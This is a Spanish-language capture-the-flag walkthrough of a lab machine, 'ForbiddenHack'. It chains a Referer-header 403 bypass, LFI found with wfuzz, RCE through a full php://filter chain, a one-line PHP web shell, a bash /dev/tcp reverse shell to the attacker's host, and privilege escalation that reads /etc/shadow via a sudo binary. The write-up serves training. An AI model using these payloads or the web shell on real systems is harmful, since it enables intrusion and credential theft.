# ForbiddenHack

## 🔎 Enumeración

Se realiza un escaneo de puertos utilizando Nmap, identificando inicialmente:

* 80/tcp – HTTP

<img width="662" height="162" alt="Pasted image 20260611170501" src="https://github.com/user-attachments/assets/99663c94-51fc-439c-a31e-e8b9bca404a3" />

Se accede a la aplicación web y posteriormente se realiza un proceso de fuzzing en busca de directorios y recursos ocultos, aunque inicialmente no se encuentra información relevante

<img width="822" height="382" alt="Pasted image 20260611170609" src="https://github.com/user-attachments/assets/2a55ad0f-8402-4f1c-973a-a7950375e8c9" />

<img width="652" height="167" alt="Pasted image 20260611171113" src="https://github.com/user-attachments/assets/07a5dfe5-4eb4-4cf5-9efa-36161254ef93" />

## 🌐 Análisis de la aplicación web

Al no encontrar información útil mediante fuzzing, se decide inspeccionar el código fuente de la página web

<img width="646" height="237" alt="Pasted image 20260611171354" src="https://github.com/user-attachments/assets/ec3bbe7c-35bb-4dd4-beeb-594094514413" />

Durante esta revisión se identifica una referencia que permite descubrir un nuevo dominio: ```bypass403.pw```

Se agrega el dominio al archivo **/etc/hosts** para poder acceder correctamente a la aplicación

<img width="786" height="246" alt="Pasted image 20260611171751" src="https://github.com/user-attachments/assets/82ea0124-1815-499d-96a4-1d2935bcdf21" />

Al intentar acceder al recurso descubierto, el servidor responde con un **403 Forbidden**, por lo que se comienza a investigar una posible forma de evadir la restricción

<img width="722" height="276" alt="Pasted image 20260611171918" src="https://github.com/user-attachments/assets/b4d1f942-d101-41ae-93d4-2ebb8ec46393" />

## 🚧 Bypass del código 403

Se analiza el comportamiento de la aplicación y se descubre que el servidor valida el encabezado **Referer**

```bash
curl http://bypass403.pw/index.php -H "Referer: http://bypass403.pw"
```

<img width="737" height="607" alt="Pasted image 20260611181221" src="https://github.com/user-attachments/assets/6fd0330d-fb46-430f-b3e5-e6a3ac4f36d2" />

Se realiza una petición modificando este encabezado para simular que la solicitud proviene del propio sitio web

Al realizar la petición con el Referer adecuado, se consigue bypassear el código 403 y acceder al recurso protegido

## 🔎 Identificación del LFI

Una vez conseguido el acceso, se utiliza **Wfuzz** para enumerar posibles parámetros de la aplicación

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://bypass403.pw/index.php?FUZZ=whoami" -H "Referer: http://bypass403.pw" --hl 38 
```

<img width="1302" height="310" alt="Pasted image 20260611182412" src="https://github.com/user-attachments/assets/ce1eb26e-914a-4b6f-a8bc-484e9ee1ae2f" />

Tras realizar las pruebas correspondientes, se identifica un parámetro que permite controlar la información procesada por la aplicación

<img width="952" height="387" alt="Pasted image 20260611182915" src="https://github.com/user-attachments/assets/5c9b041a-9f5f-4071-a569-773582e83b4a" />

Al validar el comportamiento del parámetro, se confirma la existencia de una vulnerabilidad de ```LFI (Local File Inclusion)```

## 💥 De LFI a RCE

Una vez identificado el LFI, se busca una forma de convertir la lectura/inclusión de archivos en ejecución remota de comandos

Para ello se utiliza [**PHP Filter Chain Generator**](https://github.com/synacktiv/php_filter_chain_generator), una herramienta que permite generar cadenas de filtros ```php://filter``` capaces de transformar el contenido procesado por PHP

Una vez descargado el script, se procede a su ejecución:

```bash
python3 php_filter_chain_generator.py --chain 'ls -l'
```

Este comando genera una cadena que, al ser ingresada en el parámetro pages (siempre que los wrappers estén activados), ejecutará el comando ls -l. Por lo tanto, al realizar la siguiente acción:

```bash
'curl "http://bypass403.pw/index.php?pages=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp" -H "Referer: http://bypass403.pw" --output -'
```

Contemplamos que el comando se ejecutó correctamente. Así que ahora lo que haremos será generar una cadena que permita crear el parámetro a, con el cual podremos ejecutar comandos largos sin pasar el límite de caracteres de la URL ejecutando lo siguiente:

```bash
<?php system($_GET["a"]);?>
```

Esto permite utilizar un parámetro adicional para ejecutar comandos sin tener que generar una nueva cadena de filtros para cada comando

<img width="1075" height="612" alt="Pasted image 20260611184505" src="https://github.com/user-attachments/assets/8259d483-7a58-49cd-ad33-d700dd40832f" />

## 🐚 Obtención de la Reverse Shell

Con la ejecución remota de comandos confirmada, se prepara un listener mediante Netcat en el puerto 444 y pondremos:

```bash
'curl --get --data-urlencode "a=bash -c 'bash -i >& /dev/tcp/172.17.0.1/444 0>&1'" --data-urlencode "pages=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp" -H "Referer: http://bypass403.pw" http://bypass403.pw/index.php --output -'
```

<img width="1167" height="90" alt="Pasted image 20260611184643" src="https://github.com/user-attachments/assets/41f5a423-20ed-4125-bb7e-3cac9e2b9212" />

Posteriormente, se envía un comando que ejecuta una reverse shell hacia la máquina atacante

Aunque la petición parece quedarse cargando, en el listener se recibe finalmente la conexión, obteniendo acceso al sistema

<img width="816" height="176" alt="Pasted image 20260611184721" src="https://github.com/user-attachments/assets/549322e7-9438-43f5-9cee-c0f3bb3334b0" />

## 🔍 Enumeración del sistema

Una vez dentro de la máquina, se comienza la enumeración local

Se accede al directorio: ```/home/bambi```

En este directorio se encuentra la flag del usuario y, además, un directorio oculto llamado: ```.secret```

<img width="397" height="90" alt="Pasted image 20260611191008" src="https://github.com/user-attachments/assets/b0f292c3-2085-4e3c-b2a9-0ec00d16761c" />

<img width="760" height="232" alt="Pasted image 20260611184846" src="https://github.com/user-attachments/assets/0e5e547c-4d2f-401a-b261-f86a3f0b0649" />

Al acceder a este directorio se encuentra un archivo de texto que contiene información relacionada con las credenciales del usuario **bambi**

<img width="792" height="206" alt="Pasted image 20260611185037" src="https://github.com/user-attachments/assets/9b5ef89c-3ae5-4951-82c1-df6187423e5c" />

Tras decodificar la información obtenida, se recupera la contraseña

<img width="546" height="52" alt="Pasted image 20260611185205" src="https://github.com/user-attachments/assets/da558ebe-790d-48c7-96da-42ef1e36c954" />

Con las credenciales disponibles, se inicia sesión como el usuario bambi

<img width="572" height="92" alt="Pasted image 20260611185324" src="https://github.com/user-attachments/assets/90fafbd6-30e3-4973-9bd1-32c42909bb63" />

## 👑 Escalada de privilegios

Como usuario bambi, se continúa con la enumeración de los permisos disponibles

<img width="941" height="206" alt="Pasted image 20260611185433" src="https://github.com/user-attachments/assets/7c6d6950-d736-4d63-87b7-9601f864a0f4" />

Se identifica un binario que puede ejecutarse con privilegios de **root**

Para investigar su funcionamiento y localizar archivos relacionados, se utiliza: 

```bash
find / -name '*furb*' 2>/dev/null
```

<img width="672" height="120" alt="Pasted image 20260611185808" src="https://github.com/user-attachments/assets/9915c0b5-51a9-4823-9a2e-242a41f3c6e0" />

Durante la enumeración se encuentran archivos relacionados con dicho binario

<img width="670" height="85" alt="Pasted image 20260611185938" src="https://github.com/user-attachments/assets/cc5c6342-4727-4785-8cc1-c6aa61a41af7" />

Al revisar los permisos, se comprueba que el usuario dispone de permisos de lectura sobre el archivo correspondiente

<img width="577" height="86" alt="Pasted image 20260611190209" src="https://github.com/user-attachments/assets/8ff5044e-351b-4cd6-b105-fb4d2e3009ee" />

Posteriormente, se aprovecha la posibilidad de ejecutar el binario mediante sudo para acceder a información que normalmente estaría restringida

<img width="1027" height="426" alt="Pasted image 20260611190534" src="https://github.com/user-attachments/assets/dfc64b57-e0cd-4aff-8df0-559146e42015" />

Se consigue leer **/etc/shadow** con privilegios de **root** y se recuperan las credenciales necesarias para continuar

<img width="742" height="82" alt="Pasted image 20260611190653" src="https://github.com/user-attachments/assets/08e0032b-3be9-4c57-a548-ac94a0208695" />

## 🏆 Obtención de Root

Con la información obtenida durante la escalada, se continúa investigando el directorio **/root**, siguiendo además la pista encontrada anteriormente

<img width="497" height="157" alt="Pasted image 20260611190733" src="https://github.com/user-attachments/assets/96d12b97-26b4-4c50-a252-381e5c3677a6" />

Finalmente, se consiguen las credenciales necesarias para acceder como **root** y se obtiene la flag final, completando la máquina

<img width="372" height="131" alt="Pasted image 20260611191116" src="https://github.com/user-attachments/assets/92da04a5-a9b5-49da-b302-4f4362dc041b" />

## 🏁 Conclusión

Este laboratorio demuestra cómo varias vulnerabilidades y configuraciones inseguras pueden encadenarse para comprometer completamente un sistema.

La cadena de ataque comienza con un bypass de un código 403, continúa con la explotación de un LFI, que posteriormente se convierte en RCE, permitiendo obtener una reverse shell. A partir de ahí, la exposición de credenciales y una configuración insegura de permisos sobre un binario ejecutable mediante sudo permiten realizar la escalada de privilegios hasta root.
